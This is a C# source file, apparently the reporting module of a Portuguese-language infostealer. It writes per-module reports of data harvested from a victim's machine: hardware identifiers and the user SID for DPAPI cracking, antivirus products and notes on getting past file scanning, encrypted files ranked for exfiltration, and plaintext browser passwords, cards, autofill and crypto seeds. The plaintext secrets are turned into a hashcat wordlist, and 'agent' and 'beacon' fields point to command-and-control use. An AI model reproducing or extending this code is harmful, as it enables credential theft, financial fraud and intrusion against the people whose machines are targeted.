using System.Text;

namespace Teste.Core;

// Renderizador: recebe o Report ja preenchido e escreve um .txt por modulo.
// Nenhum dado e coletado aqui. Se voce precisar de um campo novo, ele nasce no Report.
public static class ReportWriter
{
    private static readonly UTF8Encoding Enc = new(true);   // BOM: acento abre no Bloco de Notas

    public static string Write(Report r, IEnumerable<string> executed)
    {
        var dir = Path.Combine(Flags.ReportsDir, r.StartedAt.ToLocalTime().ToString("yyyy-MM-dd_HH-mm-ss"));
        Directory.CreateDirectory(dir);
        Trim(Flags.ReportsDir, Limits.ReportDays);

        var done = executed.ToHashSet(StringComparer.OrdinalIgnoreCase);
        var files = new List<string>();

        files.Add(Save(dir, "00_resumo.txt", Resumo(r, done)));
        if (done.Contains("machine")) files.Add(Save(dir, "10_maquina.txt", Maquina(r)));
        if (done.Contains("antivirus")) files.Add(Save(dir, "15_antivirus.txt", Antivirus(r)));
        if (done.Contains("targets")) files.Add(Save(dir, "20_alvos.txt", Alvos(r)));
        if (done.Contains("software")) files.Add(Save(dir, "30_software.txt", Software(r)));
        if (done.Contains("chrome")) files.Add(Save(dir, "40_secrets.txt", Secrets(r)));
        if (done.Contains("browser")) files.Add(Save(dir, "45_navegador.txt", Navegador(r)));
        if (done.Contains("text")) files.Add(Save(dir, "46_texto.txt", Texto(r)));
        if (r.Errors.Count > 0) files.Add(Save(dir, "90_erros.txt", Erros(r)));

        File.WriteAllText(Path.Combine(dir, "relatorio.json"), r.ToJson(true), Enc);
        return dir;
    }

    private static string Antivirus(Report r)
    {
        var sb = new StringBuilder(Cab("SEGURANCA DA MAQUINA", r));
        sb.AppendLine($"acao tomada: {r.AvAction}");
        sb.AppendLine();
        sb.AppendLine("PRODUTOS DETECTADOS");
        sb.AppendLine(new string('-', 78));
        if (r.Avs.Count == 0) sb.AppendLine("nenhum produto identificado");
        foreach (var a in r.Avs)
        {
            sb.AppendLine($"{a.Name}");
            sb.AppendLine($"    origem .... {a.Kind}    servico: {a.Service} ({a.ServiceState}, inicio {a.StartMode})");
            sb.AppendLine($"    caminho ... {a.Path}");
            sb.AppendLine($"    state ..... {a.ProductState}");
            sb.AppendLine($"    acao ...... {a.Action}    {a.Note}");
        }

        sb.AppendLine();
        sb.AppendLine($"PROCESSOS DE TERCEIROS ATIVOS ({r.Filters.Count})");
        sb.AppendLine(new string('-', 78));
        foreach (var p in r.Filters)
            sb.AppendLine($"    pid {p.Pid,-7} pai {p.Parent,-7} {p.Name,-24} [{p.Owner}]  {p.Image}");

        sb.AppendLine();
        sb.AppendLine("MINIFILTROS DO NUCLEO  (quem realmente varre o I/O de arquivo)");
        sb.AppendLine(new string('-', 78));
        sb.AppendLine(r.FilterOutput);
        sb.AppendLine();
        sb.AppendLine("Se algum filtro acima pertence a um antivirus de terceiros, suspender o");
        sb.AppendLine("processo de usuario dele NAO para a varredura de arquivos. So a exclusao");
        sb.AppendLine("de caminho, ou a saida do filtro, resolve.");
        return sb.ToString();
    }

    private static string Save(string dir, string name, string body)
    {
        var p = Path.Combine(dir, name);
        File.WriteAllText(p, body, Enc);
        return p;
    }

    private static void Trim(string root, int dias)
    {
        try
        {
            foreach (var d in Directory.EnumerateDirectories(root))
                if (Directory.GetCreationTimeUtc(d).ToLocalTime() < DateTime.Now.AddDays(-dias))
                    Directory.Delete(d, true);
        }
        catch { }
    }

    private static string Cab(string titulo, Report r)
    {
        var sb = new StringBuilder();
        sb.AppendLine(new string('=', 78));
        sb.AppendLine(titulo);
        sb.AppendLine(new string('=', 78));
        sb.AppendLine($"execucao : {r.RunId}");
        sb.AppendLine($"agente   : {r.Agent}");
        sb.AppendLine($"beacon   : {r.BeaconId}");
        sb.AppendLine($"inicio   : {r.StartedAt.ToLocalTime():yyyy-MM-dd HH:mm:ss}  ({r.StartedAt:O})");
        sb.AppendLine($"duracao  : {r.ScanSeconds:F2} s");
        sb.AppendLine($"maquina  : {r.Machine.Host} / {r.Machine.User}");
        sb.AppendLine();
        return sb.ToString();
    }

    private static string Resumo(Report r, HashSet<string> done)
    {
        var sb = new StringBuilder(Cab("RESUMO DA EXECUCAO", r));
        sb.AppendLine($"raivas scanadas : {(Flags.Roots.Count > 0 ? string.Join(", ", Flags.Roots) : "todos os discos fixos e removiveis")}");
        sb.AppendLine();
        sb.AppendLine("MODULOS");
        sb.AppendLine(new string('-', 78));
        void Linha(string mod, string arquivo, string qtd) =>
            sb.AppendLine($"{mod,-10} {arquivo,-18} {qtd}");

        Linha("machine", "10_maquina.txt", done.Contains("machine") ? "ok" : "nao rodou");
        Linha("targets", "20_alvos.txt", $"{r.Targets.Count} alvos");
        Linha("software", "30_software.txt", $"{r.Software.Count} programas");
        Linha("chrome", "40_secrets.txt", $"{r.Secrets.Count} segredos");
        Linha("erros", "90_erros.txt", $"{r.Errors.Count} ocorrencias");
        sb.AppendLine();
        sb.AppendLine("LEITURA PARA QUEM VAI QUEBRAR A CIFRA");
        sb.AppendLine(new string('-', 78));
        var alta = r.Targets.Count(t => t.Confidence == "alta");
        sb.AppendLine($"alvos com assinatura confirmada ....... {alta}");
        sb.AppendLine($"alvos que exigem imagem completa ...... {r.Targets.Count(t => t.WholeFileNeeded)}");
        sb.AppendLine($"volume total estimado ................. {r.Targets.Sum(t => t.Size):N0} bytes");
        sb.AppendLine($"segredos uteis como wordlist .......... {r.Secrets.Count(s => s.Status == "ok")}");
        sb.AppendLine($"segredos travados por app-bound ....... {r.Secrets.Count(s => s.Status == "app_bound")}");
        return sb.ToString();
    }

    private static string Maquina(Report r)
    {
        var m = r.Machine;
        var sb = new StringBuilder(Cab("MAQUINA", r));
        void Campo(string k, string v) => sb.AppendLine($"{k + ":",-18} {v}");
        Campo("host", m.Host);
        Campo("usuario", m.User);
        Campo("SID", m.Sid);
        Campo("sistema", m.Os);
        Campo("machine guid", m.MachineGuid);
        Campo("bios serial", m.BiosSerial);
        Campo("cpu", m.Cpu);
        Campo("ligada ha", $"{m.UptimeSeconds / 3600} h {m.UptimeSeconds % 3600 / 60} min");
        Campo("administrador", m.Admin ? "sim" : "nao");
        sb.AppendLine();
        sb.AppendLine("O SID acima e o que indexa as masterkeys de DPAPI e o que o hashcat");
        sb.AppendLine("precisa para reconstruir blobs protegidos por usuario.");
        return sb.ToString();
    }

    private static string Alvos(Report r)
    {
        var sb = new StringBuilder(Cab("ALVOS CIFRADOS ENCONTRADOS", r));
        if (r.Targets.Count == 0)
        {
            sb.AppendLine("Nenhum alvo. Confira as raivas escaneadas acima antes de confiar nisso.");
            return sb.ToString();
        }

        sb.AppendLine("POR TIPO");
        sb.AppendLine(new string('-', 78));
        sb.AppendLine($"{"tipo",-16} {"qtd",5}  {"bytes",18}  modos sugeridos");
        foreach (var g in r.Targets.GroupBy(t => t.Kind).OrderByDescending(g => g.Sum(t => t.Size)))
        {
            var modos = string.Join("/", g.Select(t => t.ModeHint?.ToString())
                                          .Where(x => x != null).Distinct()!);
            sb.AppendLine($"{g.Key,-16} {g.Count(),5}  {g.Sum(t => t.Size),18:N0}  {modos}");
        }

        sb.AppendLine();
        sb.AppendLine("DETALHE (ordenado por tamanho, maior primeiro)");
        sb.AppendLine(new string('-', 78));
        foreach (var t in r.Targets.OrderByDescending(t => t.Size))
        {
            sb.AppendLine($"caminho .... {t.Path}");
            sb.AppendLine($"tipo ....... {t.Kind}    modo: {t.ModeHint?.ToString() ?? "a definir"}    entropia: {(t.Entropy?.ToString("F2") ?? "-")}    confianca: {t.Confidence}");
            sb.AppendLine($"tamanho .... {t.Size:N0} bytes    extrator: {t.Extractor}");
            sb.AppendLine($"modificado . {t.Mtime}");
            sb.AppendLine($"imagem completa necessaria: {(t.WholeFileNeeded ? "SIM" : "nao (cabecalho basta)")}    header: {t.HeaderBytes:N0} bytes");
            sb.AppendLine($"impressao digital: {t.Fingerprint}");
            sb.AppendLine(new string('-', 78));
        }

        var pesados = r.Targets.Where(t => t.WholeFileNeeded).ToList();
        if (pesados.Count > 0)
        {
            sb.AppendLine();
            sb.AppendLine("PRECISAM DE CANAL DE ARQUIVO GRANDE (nao vao por POST)");
            sb.AppendLine(new string('-', 78));
            foreach (var t in pesados.OrderByDescending(t => t.Size))
                sb.AppendLine($"{t.Size,18:N0}  {t.Kind,-16}  {t.Path}");
        }
        return sb.ToString();
    }

    private static string Software(Report r)
    {
        var sb = new StringBuilder(Cab("PROGRAMAS INSTALADOS", r));
        sb.AppendLine($"{r.Software.Count} entradas. Lista a presenca de ferramentas de cifra,");
        sb.AppendLine("que prediz o formato dos alvos a esperar no disco.");
        sb.AppendLine(new string('-', 78));
        var interesse = new[] { "veracrypt", "truecrypt", "bitlocker", "7-zip", "7zip", "winrar", "rar",
                                "keepass", " KeePass", "1password", "lastpass", "bitwarden", "pgp", "gnupg",
                                "acrobat", "office", "outlook", "virtualbox", "vmware", "sql" };
        var hits = r.Software.Where(p => interesse.Any(i => p.Name.Contains(i, StringComparison.OrdinalIgnoreCase))).ToList();
        if (hits.Count > 0)
        {
            sb.AppendLine();
            sb.AppendLine("RELEVANTES PARA RECUPERACAO");
            foreach (var p in hits.DistinctBy(p => p.Name).OrderBy(p => p.Name))
                sb.AppendLine($"{p.Name,-55} {p.Version}");
        }
        sb.AppendLine();
        sb.AppendLine("TODOS");
        foreach (var p in r.Software.DistinctBy(p => p.Name).OrderBy(p => p.Name))
            sb.AppendLine($"{p.Name,-55} {p.Version}  {p.Vendor}");
        return sb.ToString();
    }

    private static string Secrets(Report r)
    {
        var sb = new StringBuilder(Cab("SEGREDOS EM CLARO (MUNICAO DE BRUTE FORCE)", r));
        sb.AppendLine("ATENCAO: este arquivo contem senha aberta. Nao mande por canal imprudente.");
        sb.AppendLine();
        sb.AppendLine($"{"status",-14} {"qtd",5}");
        foreach (var g in r.Secrets.GroupBy(s => s.Status).OrderByDescending(g => g.Count()))
            sb.AppendLine($"{g.Key,-14} {g.Count(),5}");
        sb.AppendLine();
        sb.AppendLine(new string('-', 78));

        foreach (var fonte in r.Secrets.GroupBy(s => s.Source))
        {
            sb.AppendLine();
            sb.AppendLine($"FONTE: {fonte.Key}");
            foreach (var s in fonte)
            {
                sb.AppendLine($"[{s.Kind}] {s.Key}");
                if (!string.IsNullOrEmpty(s.User)) sb.AppendLine($"    usuario: {s.User}");
                sb.AppendLine($"    valor  : {Show(s.Value)}   ({s.Status})");
            }
        }

        var wordlist = r.Secrets.Where(s => s.Status == "ok" && !string.IsNullOrWhiteSpace(s.Value))
                                .Select(s => s.Value!.Trim()).Distinct(StringComparer.OrdinalIgnoreCase)
                                .OrderByDescending(s => s.Length).ToList();
        sb.AppendLine();
        sb.AppendLine(new string('-', 78));
        sb.AppendLine($"WORDLIST DERIVADA ({wordlist.Count} candidatos unicos)");
        sb.AppendLine("Copie as linhas abaixo para um arquivo e use como -w no hashcat.");
        foreach (var w in wordlist) sb.AppendLine(w);
        return sb.ToString();
    }
    
        private static string Navegador(Report r)
    {
        var sb = new StringBuilder(Cab("NAVEGADOR: HISTORICO, CARTOES, AUTOFILL", r));
        var grupos = r.Secrets
            .Where(s => s.Kind is "historico" or "cartao" or "autofill" or "download" or "senha")
            .GroupBy(s => (s.Source, s.Kind))
            .OrderBy(g => g.Key.Source).ThenBy(g => g.Key.Kind);

        foreach (var g in grupos)
        {
            sb.AppendLine();
            sb.AppendLine($"{g.Key.Source} :: {g.Key.Kind} ({g.Count()})");
            sb.AppendLine(new string('-', 78));
            foreach (var s in g)
            {
                sb.AppendLine($"  {s.Key}");
                if (!string.IsNullOrEmpty(s.Value)) sb.AppendLine($"      valor  : {Show(s.Value)}");
                if (!string.IsNullOrEmpty(s.User))  sb.AppendLine($"      dado   : {s.User}");
                if (!string.IsNullOrEmpty(s.Extra)) sb.AppendLine($"      extra  : {s.Extra}");

            }
        }
        if (r.Secrets.Count == 0) sb.AppendLine("nenhum navegador encontrado.");
        return sb.ToString();
    }
        private static string Texto(Report r)
    {
        var sb = new StringBuilder(Cab("TEXTO: SENHAS, SEEDS E CHAVES EM ARQUIVOS", r));
        foreach (var g in r.Secrets.Where(s => s.Source == "texto")
                                   .GroupBy(s => s.Key).OrderBy(g => g.Key))
        {
            sb.AppendLine();
            sb.AppendLine(g.Key);
            sb.AppendLine(new string('-', 78));
            foreach (var s in g)
                sb.AppendLine($"  L{s.User} [{s.Kind}] {Show(s.Value)}");
        }
        if (!r.Secrets.Any(s => s.Source == "texto")) sb.AppendLine("nenhum arquivo com segredo.");
        return sb.ToString();
    }
    private static string Erros(Report r)
    {
        var sb = new StringBuilder(Cab("OCORRENCIAS", r));
        sb.AppendLine("Cada linha abaixo e um modulo que nao viu alguma coisa. Isso e fato, nao bug.");
        sb.AppendLine(new string('-', 78));
        foreach (var e in r.Errors)
            sb.AppendLine($"[{e.Stage}] {e.Message}");
        return sb.ToString();
    }

    private static string Show(string? v)
    {
        if (string.IsNullOrEmpty(v)) return "(vazio)";
        if (!Flags.Mask) return v;
        if (v.Length <= 4) return new string('*', v.Length);
        return v[..2] + new string('*', Math.Max(3, v.Length - 4)) + v[^2..];
    }
}